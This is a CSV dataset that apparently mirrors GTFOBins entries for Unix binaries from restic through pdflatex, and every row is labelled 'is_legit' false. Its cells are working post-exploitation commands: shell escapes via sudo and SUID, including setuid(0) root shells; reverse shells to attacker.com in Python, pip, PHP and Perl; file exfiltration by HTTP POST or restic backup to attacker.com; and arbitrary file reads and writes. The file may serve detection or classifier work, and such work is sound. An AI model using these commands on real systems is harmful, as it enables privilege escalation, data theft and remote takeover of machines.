"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"restic","","","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:  ```console RPORT=12345 NAME=backup_name ./rest-server --listen "":$RPORT"" restic init -r ""rest:http://localhost:$RPORT/$NAME"" ```  To extract the data from the restic repository in the current directory on the attacker side:  ```console restic restore -r ""/tmp/restic/$NAME"" latest --target . ```  Upload data to the attacker server with the following commands.","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name ./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","","","","","","","","","","","","","","","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","","","","","","","","","","","","","","","","","","false"
"redis","","","","","","","This works with versions lower than 7.","","","","","","IP=127.0.0.1 redis-cli -h $IP config set dir dir_to_write_to config set dbfilename file_to_write set x ""DATA"" save","","","","","","","","","","","","","","","","","Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.","","","","","","","","","","","","","","","","","false"
"redcarpet","","","","","","LFILE=file_to_read sudo redcarpet ""$LFILE""","The file is actually parsed as a Markdown file.","","LFILE=file_to_read redcarpet ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"red","","","","","","sudo red file_to_write a DATA . w q","Read and write files limited to the current directory.","","red file_to_read ,p q","","","","red file_to_write a DATA . w q","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"readelf","","","","","","LFILE=file_to_read sudo readelf -a @$LFILE","Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.","","LFILE=file_to_read readelf -a @$LFILE","","LFILE=file_to_read ./readelf -a @$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rc","","","rc -c '/bin/sh'","","","sudo rc -c '/bin/sh'","","","","","./rc -c '/bin/sh -p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rake","","","rake -p '`/bin/sh 1>&0`'","","","sudo rake -p '`/bin/sh 1>&0`'","","","LFILE=file-to-read rake -f $LFILE","","","","","","./rake -p '`/bin/sh 1>&0`'","","","","The file is actually parsed and the first wrong line is returned in an error message.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"python","","","python -c 'import os; os.system(""/bin/sh"")'","","","sudo python -c 'import os; os.system(""/bin/sh"")'","The payloads are compatible with both Python version 2 and 3.","","python -c 'print(open(""file_to_read"").read())'","","./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","","python -c 'open(""file_to_write"",""w+"").write(""DATA"")'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])'","","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' ''-|-''export LPORT=8888 python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' '']","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'","","","","","","python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","","","./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","","","","","false"
"pwsh","","","pwsh","","","sudo pwsh","","","","","","","export LFILE=file_to_write pwsh -c '""DATA"" | Out-File $env:LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"puppet","","","puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","","","sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","","","LFILE=file_to_read puppet filebucket -l diff /dev/null $LFILE","","","","LFILE=""/tmp/file_to_write"" puppet apply -e ""file { '$LFILE': content => 'DATA' }""","","","","","","The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.","","","","","","","","","","","The file path must be absolute.","","","","","","","","","","","","","","","","","false"
"ptx","","","","","","LFILE=file_to_read sudo ptx -w 5000 ""$LFILE""","While the program is capable of reading the file, it outputs a ""permuted index"" of its content, thus altering it. Adjusting the options could yield more readable outputs.","","LFILE=file_to_read ptx -w 5000 ""$LFILE""","","LFILE=file_to_read ./ptx -w 5000 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"psql","","","psql \? !/bin/sh","","","psql \? !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"psftp","","","psftp !/bin/sh","","","sudo psftp !/bin/sh","","","","","","","","","sudo psftp !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pry","","","pry system(""/bin/sh"")","","","sudo pry system(""/bin/sh"")","","","","","","","","","./pry system(""/bin/sh"")","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pr","","","","","","LFILE=file_to_read pr -T $LFILE","Some bytes are altered so it might not be suitable for binary files.","","LFILE=file_to_read pr -T $LFILE","","LFILE=file_to_read pr -T $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"posh","","","posh","","","sudo posh","","","","","","","","","./posh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pkg","","","","","It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF ```","sudo pkg install -y --no-repo-update ./x-1.0.txz","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pkexec","","","","","","sudo pkexec /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pip","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py pip install $TF","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo pip install $TF","","","TF=$(mktemp -d) echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py pip install $TF","","","","export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py pip install $TF","","","","Fetch a remote file via HTTP GET request. It needs an absolute local file path.","export URL=http://attacker.com/file_to_get export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py pip install $TF","The read file content is corrupted as wrapped within an exception error.","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py pip install $TF ''-|-''export LPORT=8888 TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py pip install $TF '']","It needs an absolute local file path.","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 TF=$(mktemp -d) echo 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' > $TF/setup.py pip install $TF","","","","","","TF=$(mktemp -d) echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py pip install $TF","","","","","","","","false"
"pidstat","","","","","","COMMAND=id sudo pidstat -e $COMMAND","","","","","COMMAND=id ./pidstat -e $COMMAND","","","","","","","","","","","","","","","COMMAND=id pidstat -e $COMMAND","","","","","","","","","","","","","","","","","","","","","false"
"pico","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","[''pico ^R^X reset; sh 1>&0 2>&0 ''-|-''pico -s /bin/sh /bin/sh ^T '']","","","sudo pico ^R^X reset; sh 1>&0 2>&0","","","pico file_to_read","","","","pico file_to_write DATA ^O","","./pico -s /bin/sh /bin/sh ^T","","","","","","","","","","","","","","","","","","","","","","","","","","","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","","","","false"
"pic","","","pic -U .PS sh X sh X","","","sudo pic -U .PS sh X sh X","","","LFILE=file_to_read pic $LFILE","","","","","","./pic -U .PS sh X sh X","","","","The output is prefixed with a some content as a header.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"php","","","[''export CMD=""/bin/sh"" php -r 'system(getenv(""CMD""));' ''-|-''export CMD=""/bin/sh"" php -r 'passthru(getenv(""CMD""));' ''-|-''export CMD=""/bin/sh"" php -r 'print(shell_exec(getenv(""CMD"")));' ''-|-''export CMD=""/bin/sh"" php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));' ''-|-''export CMD=""/bin/sh"" php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }' '']","","","CMD=""/bin/sh"" sudo php -r ""system('$CMD');""","","","export LFILE=file_to_read php -r 'readfile(getenv(""LFILE""));'","","CMD=""/bin/sh"" ./php -r ""pcntl_exec('/bin/sh', ['-p']);""","","export LFILE=file_to_write php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'","","","","","","","","export CMD=""id"" php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","","Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.","LHOST=0.0.0.0 LPORT=8888 php -S $LHOST:$LPORT","write data to a file, filename should be absolute.","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'","","","","","","","","","CMD=""/bin/sh"" ./php -r ""posix_setuid(0); system('$CMD');""","","","","","false"
"pg","","","pg /etc/profile !/bin/sh","","","sudo pg /etc/profile !/bin/sh","","","pg file_to_read","","./pg file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pexec","","","pexec /bin/sh","","","sudo pexec /bin/sh","","","","","./pexec /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"perlbug","","","perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'","","","sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"perl","","","perl -e 'exec ""/bin/sh"";'","","","sudo perl -e 'exec ""/bin/sh"";'","","","LFILE=file_to_read perl -ne print $LFILE","","./perl -e 'exec ""/bin/sh"";'","","","","","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","","","","","","","","","./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","","","","","false"
"perf","","","perf stat /bin/sh","","","sudo perf stat /bin/sh","","","","","./perf stat /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pdftex","","","pdftex --shell-escape '\write18{/bin/sh}\end'","","","sudo pdftex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./pdftex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pdflatex","","","pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf - ''-|-''sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf -","","","","","","./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
